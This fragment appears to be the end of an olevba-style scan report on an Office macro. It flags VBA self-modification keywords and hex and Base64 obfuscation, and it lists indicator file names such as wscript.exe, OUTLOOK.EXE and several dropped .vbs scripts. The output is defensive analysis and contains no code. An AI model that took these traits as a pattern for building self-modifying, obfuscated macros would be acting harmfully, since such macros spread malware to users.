|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |OUTLOOK.EXE         |Executable file name                         |
|IOC       |_clear.vbs          |Executable file name                         |
|IOC       |_Search.vbs         |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
|IOC       |_Key.vbs            |Executable file name                         |
|IOC       |setup.inf           |Executable file name                         |
|IOC       |_key.vbs            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

